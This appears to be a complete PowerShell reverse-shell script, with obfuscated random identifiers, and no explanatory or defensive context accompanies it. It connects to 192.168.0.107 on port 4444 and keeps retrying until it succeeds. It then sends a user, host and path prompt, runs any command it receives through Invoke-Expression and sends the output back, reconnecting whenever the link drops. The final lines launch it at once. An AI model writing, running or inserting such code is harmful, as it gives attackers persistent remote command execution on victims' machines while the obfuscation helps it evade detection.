class FtStuRQQLFDleK {
    
    [string]$eztbwRL = "192.168.0.107"
    [int]$QYLgfZdkeCFJ = 4444

    $yZzZbVrLUdaBgB
    $sQxDdRXiRshYposzSsEX
    $TRuPOFirFVDOYDN
    $vorHr
    $ljJbHHzLF
    $DDkBxapM
    [int]$jrKxlnpwrYxJKejrPD = 50*1024

    GrZhMJxZkgXicmi() {
        $this.sQxDdRXiRshYposzSsEX = $false
        while ($true) {
            try {
                $this.sQxDdRXiRshYposzSsEX = New-Object Net.Sockets.TcpClient($this.eztbwRL, $this.QYLgfZdkeCFJ)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.GHdepQEcuwVdgiyH()
    }

    GHdepQEcuwVdgiyH() {
        $this.yZzZbVrLUdaBgB = $this.sQxDdRXiRshYposzSsEX.GetStream()
        $this.vorHr = New-Object Byte[] $this.jrKxlnpwrYxJKejrPD
        $this.DDkBxapM = New-Object Text.UTF8Encoding
        $this.TRuPOFirFVDOYDN = New-Object IO.StreamWriter($this.yZzZbVrLUdaBgB, [Text.Encoding]::UTF8, $this.jrKxlnpwrYxJKejrPD)
        $this.ljJbHHzLF = New-Object System.IO.StreamReader($this.yZzZbVrLUdaBgB)
        $this.TRuPOFirFVDOYDN.AutoFlush = $true
    }

    sYGQlUn() {
        $this.GrZhMJxZkgXicmi()
        $this.ToahdTFQznyjL()
    }

    xpbDKpyqvp($TunOoFfNYp) {
        try {
            [byte[]]$hMJBiPKCKNiWK = [text.Encoding]::Ascii.GetBytes($TunOoFfNYp)
            $this.TRuPOFirFVDOYDN.Write($hMJBiPKCKNiWK, 0, $hMJBiPKCKNiWK.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.sYGQlUn()
        }
    }

    [string] xfnwppsKERkNfqJvAma() {
        try {
            $JHnzhYGGXnMruvqPZ = $this.yZzZbVrLUdaBgB.Read($this.vorHr, 0, $this.jrKxlnpwrYxJKejrPD)    
            $TBTwoArRhSoqmhyHl = ($this.DDkBxapM.GetString($this.vorHr, 0, $JHnzhYGGXnMruvqPZ))
            return $TBTwoArRhSoqmhyHl
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.sYGQlUn()
            return ""
        }
    }

    [string] SOKvePCHThOB($TtfYtnrpQvEsyA) {
        Write-Host $TtfYtnrpQvEsyA
        try { 
            $mypKfmmrHgk = Invoke-Expression $TtfYtnrpQvEsyA | Out-String
        }
        catch {
            $iqwpunxtkNAGtbMAyqatfJL = $_.Exception
            $kUVGknObKLJOZVvQM = $_.Message
            $mypKfmmrHgk = "`n$_`n"
        }
        return $mypKfmmrHgk
    }

    [string] fHjGRZT() {
        $HXpjRzQKLCluUvKtfSpd = [Environment]::UserName
        $absHh = [System.Net.Dns]::GetHostName()
        $OhVCKoKGB = Get-Location
        return "$HXpjRzQKLCluUvKtfSpd@$absHh [$OhVCKoKGB]~$ "
    }

    ToahdTFQznyjL() {
        while ($this.sQxDdRXiRshYposzSsEX.Connected) {
            $this.xpbDKpyqvp($this.fHjGRZT())         
            $TBTwoArRhSoqmhyHl = $this.xfnwppsKERkNfqJvAma()
            $mypKfmmrHgk = "`n"
            if ([string]::IsNullOrEmpty($TBTwoArRhSoqmhyHl)) {
                continue
            }
            $mypKfmmrHgk = $this.SOKvePCHThOB($TBTwoArRhSoqmhyHl)
            $this.xpbDKpyqvp($mypKfmmrHgk + "`n")
            $this.yZzZbVrLUdaBgB.Flush()
        }
        $this.sQxDdRXiRshYposzSsEX.Close()
        $this.sYGQlUn()
    } 
}

$UnZjsBnDlXM = [FtStuRQQLFDleK]::new()
$UnZjsBnDlXM.sYGQlUn()
